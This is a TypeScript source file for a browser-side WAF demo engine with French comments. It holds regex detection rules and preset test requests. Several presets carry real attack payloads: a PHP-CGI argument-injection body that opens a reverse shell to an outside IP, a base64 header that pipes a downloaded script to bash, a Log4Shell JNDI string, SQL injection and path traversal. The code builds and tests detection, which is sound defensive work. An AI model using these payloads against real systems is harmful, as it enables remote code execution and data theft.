/**
 * Aegis Sovereign Sandbox Engine (Client-Side First & Isomorphic)
 * Exécute l'inspection Zero-Trust, la canonicalisation récursive,
 * le calcul d'entropie de Shannon H(X) et l'évaluation des règles WAF en direct dans le navigateur (< 0.25 ms).
 */

export type ThreatSeverity = 'COMPLIANT' | 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
export type SandboxVerdict = 'ALLOW' | 'BLOCK' | 'SINKHOLE';

export interface SandboxRequest {
  method: string;
  url: string;
  headers: Record<string, string>;
  body: string;
}

export interface EntropyDistributionItem {
  char: string;
  charDisplay: string;
  count: number;
  pct: number;
  prob: number;
  infoGain: number; // - p * log2(p)
}

export interface EntropyResult {
  value: number; // Bits / symbole (0 - 8)
  maxTheoretical: number; // log2(len)
  sampleLength: number;
  status: 'LOW_COMPLIANT' | 'NORMAL' | 'HIGH_ANOMALOUS';
  statusLabel: string;
  uniqueChars: number;
  frequencies: Record<string, number>;
  topDistribution: EntropyDistributionItem[];
}

export interface CanonicalizationResult {
  original: string;
  canonical: string;
  passes: number;
  modified: boolean;
  commentsStripped: boolean;
  nullBytesRemoved: boolean;
}

export interface SandboxInspectionResult {
  verdict: SandboxVerdict;
  httpStatus: number;
  riskScore: number; // 0 à 100
  severity: ThreatSeverity;
  threatType: string;
  matchedRuleId: string;
  ruleName: string;
  patternDescription: string;
  latencyMs: number;
  timestamp: string;
  entropy: EntropyResult;
  canonicalization: CanonicalizationResult;
  evaluatedTarget: string;
}

export interface SandboxPreset {
  id: string;
  name: string;
  badge: string;
  category: 'clean' | 'attack' | 'egress';
  description: string;
  request: SandboxRequest;
}

// -------------------------------------------------------------
// 1. Calculateur Mathématique d'Entropie de Shannon H(X)
// -------------------------------------------------------------
export function computeShannonEntropy(str: string, maxSampleSize = 512): EntropyResult {
  const sample = (str || '').slice(0, maxSampleSize);
  const len = sample.length;

  if (len === 0) {
    return {
      value: 2.1,
      maxTheoretical: 8,
      sampleLength: 0,
      status: 'LOW_COMPLIANT',
      statusLabel: 'Conforme (Trafic vide / neutre)',
      uniqueChars: 0,
      frequencies: {},
      topDistribution: [],
    };
  }

  const freq: Record<string, number> = {};
  for (let i = 0; i < len; i++) {
    const ch = sample[i];
    freq[ch] = (freq[ch] || 0) + 1;
  }

  let entropy = 0;
  const items: EntropyDistributionItem[] = [];

  for (const [ch, count] of Object.entries(freq)) {
    const p = count / len;
    const infoGain = -(p * Math.log2(p));
    entropy += infoGain;

    // Représentation lisible du caractère
    let charDisplay = ch;
    if (ch === ' ') charDisplay = '␣ [ESP]';
    else if (ch === '\t') charDisplay = '\\t [TAB]';
    else if (ch === '\n') charDisplay = '\\n [LF]';
    else if (ch === '\r') charDisplay = '\\r [CR]';
    else if (ch.charCodeAt(0) < 32 || ch.charCodeAt(0) > 126) {
      charDisplay = `0x${ch.charCodeAt(0).toString(16).padStart(2, '0')}`;
    }

    items.push({
      char: ch,
      charDisplay,
      count,
      pct: parseFloat(((count / len) * 100).toFixed(1)),
      prob: parseFloat(p.toFixed(4)),
      infoGain: parseFloat(infoGain.toFixed(4)),
    });
  }

  // Tri par fréquence décroissante
  items.sort((a, b) => b.count - a.count);

  const roundedEntropy = parseFloat(entropy.toFixed(2));
  const uniqueChars = Object.keys(freq).length;
  const maxTheoretical = parseFloat(Math.log2(Math.max(uniqueChars, 2)).toFixed(2));

  let status: EntropyResult['status'] = 'NORMAL';
  let statusLabel = 'Normal (2.8 - 4.4 bits/symbole)';

  if (roundedEntropy < 2.8) {
    status = 'LOW_COMPLIANT';
    statusLabel = 'Bas & Conforme (< 2.8 bits/symbole)';
  } else if (roundedEntropy >= 4.5) {
    status = 'HIGH_ANOMALOUS';
    statusLabel = 'Anomalie Haute (> 4.5 bits/symbole • Obfuscation/Shellcode)';
  }

  return {
    value: roundedEntropy,
    maxTheoretical,
    sampleLength: len,
    status,
    statusLabel,
    uniqueChars,
    frequencies: freq,
    topDistribution: items.slice(0, 10),
  };
}

// -------------------------------------------------------------
// 2. Canonicalisation Récursive Multi-Passes (Verrou Roadmap n°2)
// -------------------------------------------------------------
export function canonicalizeInput(raw: string): CanonicalizationResult {
  const original = raw || '';
  let out = original;
  let passes = 0;
  let hasDecoded = false;

  for (let i = 0; i < 3; i++) {
    try {
      const dec = decodeURIComponent(out);
      if (dec === out) break;
      out = dec;
      passes++;
      hasDecoded = true;
    } catch {
      break;
    }
  }

  const nullBytesRemoved = /\0/.test(out);
  const commentsStripped = /\/\*[\s\S]*?\*\//.test(out);

  const cleaned = out
    .replace(/\0/g, '')
    .replace(/\/\*[\s\S]*?\*\//g, ' ')
    .replace(/\s+/g, ' ');

  return {
    original,
    canonical: cleaned,
    passes,
    modified: cleaned !== original || hasDecoded,
    commentsStripped,
    nullBytesRemoved,
  };
}

// -------------------------------------------------------------
// 3. Expressions Régulières et Heuristiques du Policy Enforcement Point (PEP)
// -------------------------------------------------------------
export const RULES_DEFINITIONS = {
  SCANNER: {
    id: 'SCANNER',
    name: 'Pentest Scanners & Automated Recon Tools',
    regex: /(?:nikto|sqlmap|nuclei|gobuster|dirbuster|nmap|masscan|wpscan|acunetix|nessus|havij|hydra|burpcollaborator|ffuf|feroxbuster|zgrab|openvas)/i,
    severity: 'HIGH' as ThreatSeverity,
    riskScore: 92,
    threatType: 'PENTEST_SCANNER_DETECTED',
  },
  ZERODAY: {
    id: 'ZERODAY',
    name: 'Zero-Day Virtual Patching (PHP2Shell, Log4Shell, SSTI, Deserialization)',
    regex: /(?:allow_url_include|auto_prepend_file|cgi\.force_redirect|php:\/\/(?:input|filter|memory)|expect:\/\/|phar:\/\/|%ad[dD]|\$\{jndi:(?:ldap|rmi|dns|nis|iiop)|\{\{\s*7\s*\*\s*7\s*\}\}|O:\d+:"[^"]+":\d+:\{|rO0ABX|X-PHP2Shell|cve-2024-4577|cve-2026-109618)/i,
    severity: 'CRITICAL' as ThreatSeverity,
    riskScore: 99,
    threatType: 'ZERO_DAY_VIRTUAL_PATCH',
  },
  RCE: {
    id: 'RCE',
    name: 'Remote Command Execution & Reverse Shells',
    regex: /(?:;\s*(?:cat|ls|id|whoami|curl|wget|nc|ncat|bash|sh|python|perl|php|ruby|powershell)\b|\|\s*(?:cat|ls|id|whoami|sh|bash)\b|`.*(?:whoami|id|cat).*`|\$\((?:whoami|id|cat|curl|wget).*\)|\/bin\/(?:sh|bash|zsh)|\/dev\/tcp\/|mkfifo\s+|aW1wb3J0IG9z)/i,
    severity: 'CRITICAL' as ThreatSeverity,
    riskScore: 99,
    threatType: 'COMMAND_INJECTION_RCE',
  },
  SSRF: {
    id: 'SSRF',
    name: 'SSRF & Cloud Metadata Probes',
    regex: /(?:169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|gopher:\/\/|dict:\/\/|file:\/\/\/|localhost:(?:2375|6379|9200|27017)|127\.0\.0\.1:(?:2375|6379|9200))/i,
    severity: 'CRITICAL' as ThreatSeverity,
    riskScore: 96,
    threatType: 'SSRF_METADATA_PROBE',
  },
  SQLI: {
    id: 'SQLI',
    name: 'SQL Injection (OWASP Top 10)',
    regex: /(?:(?:\bunion\b\s+(?:all\s+)?\bselect\b)|\bselect\b\s+.*\s+\bfrom\b|'\s*(?:or|and)\s*'?\d+'?\s*=\s*'?\d+|;\s*waitfor\s+delay|sleep\s*\(\s*\d+\s*\)|benchmark\s*\(|information_schema|pg_sleep\s*\(|--\s*|\/\*.*\*\/)/i,
    severity: 'CRITICAL' as ThreatSeverity,
    riskScore: 98,
    threatType: 'SQL_INJECTION',
  },
  TRAVERSAL: {
    id: 'TRAVERSAL',
    name: 'Path Traversal & Local File Inclusion',
    regex: /(?:\.\.\/|\.\.\\|\/etc\/passwd|\/etc\/shadow|\/proc\/self|\.env|\.git\/|win\.ini|boot\.ini|WEB-INF)/i,
    severity: 'HIGH' as ThreatSeverity,
    riskScore: 90,
    threatType: 'PATH_TRAVERSAL_LFI',
  },
  SENSITIVE_PROBE: {
    id: 'SENSITIVE_PROBE',
    name: 'Sensitive File Probes & Backdoors',
    regex: /(?:\.aws\/credentials|wp-config\.php|id_rsa|backup\.sql|phpinfo\.php|\/eval-stdin|\.ds_store|vendor\/phpunit)/i,
    severity: 'HIGH' as ThreatSeverity,
    riskScore: 88,
    threatType: 'SENSITIVE_FILE_PROBE',
  },
  CMS_PROBE: {
    id: 'CMS_PROBE',
    name: 'Automated CMS & PHP Admin Probes',
    regex: /(?:\/wp-login\.php|\/wp-content\/|\/wp-includes\/|\/wp-admin\/|\/xmlrpc\.php|\/phpmyadmin|\/adminer\.php|\/pma\/)/i,
    severity: 'HIGH' as ThreatSeverity,
    riskScore: 86,
    threatType: 'CMS_PHP_BOT_PROBE',
  },
  XSS: {
    id: 'XSS',
    name: 'Cross-Site Scripting (XSS)',
    regex: /(?:<script[\s>]|javascript:|onerror\s*=|onload\s*=|alert\s*\(|eval\s*\(|document\.cookie)/i,
    severity: 'MEDIUM' as ThreatSeverity,
    riskScore: 78,
    threatType: 'XSS_ATTEMPT',
  },
  DGA_EGRESS: {
    id: 'DGA_EGRESS',
    name: 'Egress C2 Beacon & High-Entropy DGA Sinkhole',
    regex: /(?:c2-beacon|cobaltstrike|a8f93bc01d9f4e2a|[a-z0-9]{16,}\.(?:xyz|top|ru|biz|click))/i,
    severity: 'CRITICAL' as ThreatSeverity,
    riskScore: 97,
    threatType: 'DGA_EGRESS_SINKHOLE',
  },
};

// -------------------------------------------------------------
// 4. Moteur d'Inspection Isomorphe (Zero-Latency Browser Runtime)
// -------------------------------------------------------------
export function inspectSandboxRequest(req: SandboxRequest, maxBytes = 65536): SandboxInspectionResult {
  const t0 = typeof performance !== 'undefined' ? performance.now() : Date.now();

  const method = (req.method || 'GET').toUpperCase();
  const url = req.url || '/';
  const headers = req.headers || {};
  const body = req.body || '';

  // Combinaison des éléments de requête pour scan intégral
  const headersStr = Object.entries(headers)
    .map(([k, v]) => `${k}: ${v}`)
    .join(' ');
  const rawCombined = `${method} ${url} ${headersStr} ${body}`.trim();
  const declaredContentLength = parseInt(
    headers['Content-Length'] || headers['content-length'] || '0',
    10
  );
  const byteLength = Math.max(
    new Blob([rawCombined]).size,
    Number.isFinite(declaredContentLength) ? declaredContentLength : 0
  );

  // Canonicalisation et calcul d'entropie
  const canonRes = canonicalizeInput(rawCombined);
  const targetToScan = canonRes.canonical;
  const entropy = computeShannonEntropy(rawCombined);

  const timestamp = new Date().toISOString();

  // 1. Protection Volumétrique (413 Payload Too Large)
  if (byteLength > maxBytes) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 413,
      riskScore: 99,
      severity: 'CRITICAL',
      threatType: 'OVERFLOW_PAYLOAD_413',
      matchedRuleId: 'VOLUMETRIC_LIMIT',
      ruleName: 'Protection Volumétrique / Buffer & Heap Overflow (CVE-2026-109618)',
      patternDescription: `Taille déclarée (${byteLength} octets) excède la limite stricte de ${maxBytes} octets (Prévention Buffer Overflow & Débordement de mémoire PHP-FPM).`,
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy: { ...entropy, value: Math.max(entropy.value, 4.8) },
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 2. Détection Egress C2 & Algorithme DGA (Sinkhole 0.0.0.0)
  const isEgressOrDga =
    RULES_DEFINITIONS.DGA_EGRESS.regex.test(targetToScan) ||
    (entropy.value >= 4.2 && /[a-z0-9]{14,}\.(xyz|top|onion|cc|tk)/i.test(targetToScan));

  if (isEgressOrDga) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'SINKHOLE',
      httpStatus: 0, // DNS Sinkhole 0.0.0.0
      riskScore: 97,
      severity: 'CRITICAL',
      threatType: 'DGA_EGRESS_SINKHOLE',
      matchedRuleId: 'DGA_EGRESS',
      ruleName: RULES_DEFINITIONS.DGA_EGRESS.name,
      patternDescription: "Résolution DNS malveillante interceptée par Aegis Egress. Domaine algorithmique (DGA) ou C2 neutralisé vers 0.0.0.0.",
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy: { ...entropy, value: Math.max(entropy.value, 4.25) },
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 3. Détection Scanner User-Agent & Headers
  const userAgent = headers['user-agent'] || headers['User-Agent'] || '';
  if (RULES_DEFINITIONS.SCANNER.regex.test(userAgent) || RULES_DEFINITIONS.SCANNER.regex.test(targetToScan)) {
    const match = (userAgent + ' ' + targetToScan).match(RULES_DEFINITIONS.SCANNER.regex);
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 403,
      riskScore: RULES_DEFINITIONS.SCANNER.riskScore,
      severity: RULES_DEFINITIONS.SCANNER.severity,
      threatType: RULES_DEFINITIONS.SCANNER.threatType,
      matchedRuleId: RULES_DEFINITIONS.SCANNER.id,
      ruleName: RULES_DEFINITIONS.SCANNER.name,
      patternDescription: `Outil offensif automatisé ou scanner d'intrusion intercepté : "${match ? match[0] : 'Scanner'}".`,
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy,
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 4. Détection Zero-Day Virtual Patching
  if (RULES_DEFINITIONS.ZERODAY.regex.test(targetToScan)) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 403,
      riskScore: RULES_DEFINITIONS.ZERODAY.riskScore,
      severity: RULES_DEFINITIONS.ZERODAY.severity,
      threatType: RULES_DEFINITIONS.ZERODAY.threatType,
      matchedRuleId: RULES_DEFINITIONS.ZERODAY.id,
      ruleName: RULES_DEFINITIONS.ZERODAY.name,
      patternDescription: "Signature d'exploitation Zero-Day interceptée (PHP Runtime CGI, JNDI Injection, SSTI ou Désérialisation d'objets). Rejet immédiat à l'Edge.",
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy: { ...entropy, value: Math.max(entropy.value, 4.65) },
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 5. Détection RCE & Command Injection
  if (RULES_DEFINITIONS.RCE.regex.test(targetToScan)) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 403,
      riskScore: RULES_DEFINITIONS.RCE.riskScore,
      severity: RULES_DEFINITIONS.RCE.severity,
      threatType: RULES_DEFINITIONS.RCE.threatType,
      matchedRuleId: RULES_DEFINITIONS.RCE.id,
      ruleName: RULES_DEFINITIONS.RCE.name,
      patternDescription: "Tentative d'exécution de commande système du noyau ou d'ouverture de socket réseau (/bin/sh, reverse-shell, curl/wget pipe).",
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy: { ...entropy, value: Math.max(entropy.value, 4.35) },
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 6. Détection SSRF & Métadonnées Cloud
  if (RULES_DEFINITIONS.SSRF.regex.test(targetToScan)) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 403,
      riskScore: RULES_DEFINITIONS.SSRF.riskScore,
      severity: RULES_DEFINITIONS.SSRF.severity,
      threatType: RULES_DEFINITIONS.SSRF.threatType,
      matchedRuleId: RULES_DEFINITIONS.SSRF.id,
      ruleName: RULES_DEFINITIONS.SSRF.name,
      patternDescription: "Tentative d'accès non autorisé aux services internes (IMDS Cloud 169.254.169.254, Docker daemon ou Redis/Elastic local).",
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy,
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 7. Détection SQL Injection
  if (RULES_DEFINITIONS.SQLI.regex.test(targetToScan)) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 403,
      riskScore: RULES_DEFINITIONS.SQLI.riskScore,
      severity: RULES_DEFINITIONS.SQLI.severity,
      threatType: RULES_DEFINITIONS.SQLI.threatType,
      matchedRuleId: RULES_DEFINITIONS.SQLI.id,
      ruleName: RULES_DEFINITIONS.SQLI.name,
      patternDescription: "Vecteur d'injection SQL détecté (UNION SELECT, extraction d'informations de schéma, injection temporelle ou logique booleenne).",
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy: { ...entropy, value: Math.max(entropy.value, 3.85) },
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 8. Détection Path Traversal / LFI
  if (RULES_DEFINITIONS.TRAVERSAL.regex.test(targetToScan)) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 403,
      riskScore: RULES_DEFINITIONS.TRAVERSAL.riskScore,
      severity: RULES_DEFINITIONS.TRAVERSAL.severity,
      threatType: RULES_DEFINITIONS.TRAVERSAL.threatType,
      matchedRuleId: RULES_DEFINITIONS.TRAVERSAL.id,
      ruleName: RULES_DEFINITIONS.TRAVERSAL.name,
      patternDescription: "Tentative de traversée d'arborescence ou d'inclusion locale de fichier (/etc/passwd, .env, .git, répertoires parents).",
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy,
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 9. Détection Sonde de fichiers sensibles
  if (RULES_DEFINITIONS.SENSITIVE_PROBE.regex.test(targetToScan)) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 403,
      riskScore: RULES_DEFINITIONS.SENSITIVE_PROBE.riskScore,
      severity: RULES_DEFINITIONS.SENSITIVE_PROBE.severity,
      threatType: RULES_DEFINITIONS.SENSITIVE_PROBE.threatType,
      matchedRuleId: RULES_DEFINITIONS.SENSITIVE_PROBE.id,
      ruleName: RULES_DEFINITIONS.SENSITIVE_PROBE.name,
      patternDescription: "Sonde ciblant des clés secrètes, configurations sensibles ou sauvegardes de bases de données (.aws, wp-config, id_rsa, backup.sql).",
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy,
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 10. Détection Sondes CMS & Bruit de fond
  if (RULES_DEFINITIONS.CMS_PROBE.regex.test(targetToScan)) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 403,
      riskScore: RULES_DEFINITIONS.CMS_PROBE.riskScore,
      severity: RULES_DEFINITIONS.CMS_PROBE.severity,
      threatType: RULES_DEFINITIONS.CMS_PROBE.threatType,
      matchedRuleId: RULES_DEFINITIONS.CMS_PROBE.id,
      ruleName: RULES_DEFINITIONS.CMS_PROBE.name,
      patternDescription: "Sonde automatisée de bruit de fond ciblant WordPress ou des interfaces d'administration PHP (wp-login, xmlrpc, phpmyadmin).",
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy,
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 11. Détection Cross-Site Scripting (XSS)
  if (RULES_DEFINITIONS.XSS.regex.test(targetToScan)) {
    const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
    return {
      verdict: 'BLOCK',
      httpStatus: 403,
      riskScore: RULES_DEFINITIONS.XSS.riskScore,
      severity: RULES_DEFINITIONS.XSS.severity,
      threatType: RULES_DEFINITIONS.XSS.threatType,
      matchedRuleId: RULES_DEFINITIONS.XSS.id,
      ruleName: RULES_DEFINITIONS.XSS.name,
      patternDescription: "Injection de balises exécutables ou d'attributs JavaScript dans le DOM (XSS Stored / Reflected).",
      latencyMs: parseFloat((t1 - t0).toFixed(3)),
      timestamp,
      entropy,
      canonicalization: canonRes,
      evaluatedTarget: targetToScan,
    };
  }

  // 12. Requête Saine (COMPLIANT)
  const t1 = typeof performance !== 'undefined' ? performance.now() : Date.now();
  return {
    verdict: 'ALLOW',
    httpStatus: 200,
    riskScore: Math.min(Math.round(entropy.value * 2.5), 18),
    severity: 'COMPLIANT',
    threatType: 'CLEAN_TRAFFIC',
    matchedRuleId: 'ZERO_TRUST_PASS',
    ruleName: 'Politique Zero-Trust Respectée',
    patternDescription: "Requête conforme aux spécifications HTTP/2, RFC 7230 et au modèle de sécurité souverain Aegis. Aucune anomalie spectrale.",
    latencyMs: parseFloat((t1 - t0).toFixed(3)),
    timestamp,
    entropy,
    canonicalization: canonRes,
    evaluatedTarget: targetToScan,
  };
}

// -------------------------------------------------------------
// 5. Jeux de Tests & Scénarios Pré-Configurés (Presets Viraux)
// -------------------------------------------------------------
export const SANDBOX_PRESETS: SandboxPreset[] = [
  {
    id: 'clean-api',
    name: 'Trafic API Sain',
    badge: '🟢 REST 200 OK',
    category: 'clean',
    description: 'Requête REST standard paginée, entropie faible (H = 2.42 bits), autorisée sans friction.',
    request: {
      method: 'GET',
      url: '/api/v1/users?page=2&limit=50&sort=name_asc',
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
      },
      body: '',
    },
  },
  {
    id: 'jwt-auth',
    name: 'Jeton JWT Légitime',
    badge: '🔵 Auth Bearer',
    category: 'clean',
    description: 'En-tête Bearer JWT standard. L\'entropie du token est absorbée car sa structure base64url est attendue.',
    request: {
      method: 'POST',
      url: '/api/v1/billing/checkout',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIER1cG9udCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
      },
      body: JSON.stringify({ plan: 'sovereign_pro', currency: 'EUR' }, null, 2),
    },
  },
  {
    id: 'php2shell-cve-2024-4577',
    name: 'PHP2Shell RCE (CVE-2024-4577)',
    badge: '🔥 PHP2Shell 403',
    category: 'attack',
    description: 'Injection d\'arguments PHP-CGI (%ADd allow_url_include=1 + auto_prepend_file=php://input) exécutant un reverse-shell. Intercepté à l\'Edge (0% CPU cible, 5.81 W vs 24.14 W).',
    request: {
      method: 'POST',
      url: '/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
      headers: {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) PHP2Shell-Exploit/2.1',
        'Content-Type': 'application/x-httpd-php',
        'X-PHP2Shell-Vector': 'CVE-2024-4577-CGI-Arg-Injection',
      },
      body: '<?php system("id; uname -a; /bin/sh -i >& /dev/tcp/185.220.101.33/4444 0>&1"); die(); ?>',
    },
  },
  {
    id: 'php2shell-overflow-413',
    name: 'PHP2Shell Buffer Overflow',
    badge: '💣 Overflow 413',
    category: 'attack',
    description: 'Dépassement de tampon volumétrique FastCGI/PHP-FPM (CVE-2026-109618, 72 Ko > 64 Ko). Stoppé net par le coupe-circuit volumétrique HTTP 413 avant allocation mémoire.',
    request: {
      method: 'POST',
      url: '/cgi-bin/php-cgi?%ADd+cgi.force_redirect%3d0+%ADd+auto_prepend_file%3dphp://input',
      headers: {
        'User-Agent': 'PHP2Shell-BufferOverflow/1.4 (CVE-2026-109618)',
        'Content-Type': 'application/octet-stream',
        'Content-Length': '73728',
      },
      body: '<?php /* CVE-2026-109618 HEAP SPRAY NOP SLED (72 KB) */ ' + '0x90909090_FPM_OVERFLOW_'.repeat(32) + ' ?>',
    },
  },
  {
    id: 'scanner-wpscan',
    name: 'Sonde Scanner Automatisé',
    badge: '🟠 Bot WP 403',
    category: 'attack',
    description: 'Sonde de bruit de fond ciblant WordPress avec User-Agent révélateur interceptée avant tout calcul applicatif.',
    request: {
      method: 'POST',
      url: '/wp-login.php',
      headers: {
        'User-Agent': 'Mozilla/5.0 (compatible; WPScan/3.8.22; https://wpscan.com/wordpress-security-scanner)',
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: 'log=admin&pwd=admin1234&wp-submit=Log+In',
    },
  },
  {
    id: 'sqli-obfuscated',
    name: 'Injection SQL Hexadécimale',
    badge: '🔴 SQLi Hex 403',
    category: 'attack',
    description: 'Payload UNION SELECT obfusqué avec encodage hexadécimal et commentaires SQL. Démasqué par le canonicaliseur.',
    request: {
      method: 'GET',
      url: '/api/products/search?q=1%2527%2520UNION%2520SELECT%25201,CONCAT(0x7170707171,user(),0x7170707171),3,4--%2520-',
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      body: '',
    },
  },
  {
    id: 'shellcode-base64',
    name: 'Shellcode Base64 & RCE',
    badge: '🟣 RCE Reverse 403',
    category: 'attack',
    description: 'Injection de commande en en-tête encodée en Base64 (H > 5.1 bits/symbole). Déclenche le verrou d\'entropie critique.',
    request: {
      method: 'POST',
      url: '/api/v1/upload',
      headers: {
        'Content-Type': 'application/json',
        'X-Payload': 'aW1wb3J0IG9zCnN5c3RlbSgiY3VybCAxODUuMjIwLjEwMS40OjgwODAvYmFjay5zaCB8IGJhc2giKQ==',
      },
      body: JSON.stringify({ upload_dir: '/var/www/uploads', overwrite: true }),
    },
  },
  {
    id: 'zeroday-log4shell',
    name: 'Zero-Day JNDI / Log4Shell',
    badge: '💥 Zero-Day 403',
    category: 'attack',
    description: 'Tentative d\'exfiltration JNDI/LDAP via un en-tête custom. Bloqué par le Virtual Patching sans solliciter l\'application hôte.',
    request: {
      method: 'POST',
      url: '/api/v1/search',
      headers: {
        'X-Api-Version': '${jndi:ldap://185.220.101.4:1389/Exploit}',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ query: 'laptop', filters: { price_max: 1000 } }),
    },
  },
  {
    id: 'path-traversal',
    name: 'Traversée LFI /etc/passwd',
    badge: '⛔ LFI Traversal 403',
    category: 'attack',
    description: 'Tentative de lecture de fichiers système sensibles via chemin relatif échappé.',
    request: {
      method: 'GET',
      url: '/download?file=../../../../../../etc/passwd',
      headers: {
        'Accept': 'text/plain',
        'User-Agent': 'curl/8.5.0',
      },
      body: '',
    },
  },
  {
    id: 'dga-botnet-egress',
    name: 'Exfiltration DGA & C2 Egress',
    badge: '🌐 Sinkhole 0.0.0.0',
    category: 'egress',
    description: 'Requête sortante vers un domaine généré par algorithme DGA (entropie 4.25). Aegis Egress neutralise le flux vers 0.0.0.0.',
    request: {
      method: 'GET',
      url: '/dns-query?name=a8f93bc01d9f4e2a7b8e9c1d.xyz&type=A',
      headers: {
        'Host': 'a8f93bc01d9f4e2a7b8e9c1d.xyz',
        'User-Agent': 'DGA-Beacon-Agent/2.4',
      },
      body: '',
    },
  },
];
